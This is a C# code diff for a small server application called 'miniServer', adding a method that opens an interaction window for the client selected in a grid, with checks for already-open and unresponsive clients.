@@ -191,7 +191,45 @@ namespace miniServer
 
         private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //TODO: open interact form
+            openInteractForm();
+        }
+
+        private void openInteractForm()
+        {
+            if(dataGridViewClients.CurrentCell != null)
+            {
+                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;
+
+                if (clientList[i].Interact)
+                {
+                   // if (disableOpenWarningToolStripMenuItem.Checked)
+                        MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
+
+                    foreach (Form frm in Application.OpenForms)
+                        if (frm.Name == "InteractForm")
+                        {
+                            InteractForm intForm = (InteractForm)frm;
+                            if (intForm.mc.ID == i)
+                            {
+                                intForm.WindowState = FormWindowState.Normal;
+                                intForm.Focus();
+
+
+                                return;
+                            }
+                        }
+                }
+                if (!clientList[i].IsAlive)
+                {
+                    if (MessageBox.Show("It seems the client not available, do you want to interact with it?", "Client is not alive", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
+                        return;
+                }
+
+                InteractForm f = new InteractForm(clientList[i], separator);
+                f.Show();
+            }
+
+
         }
 
         private void EditNoteToolStripMenuItem_Click(object sender, EventArgs e)
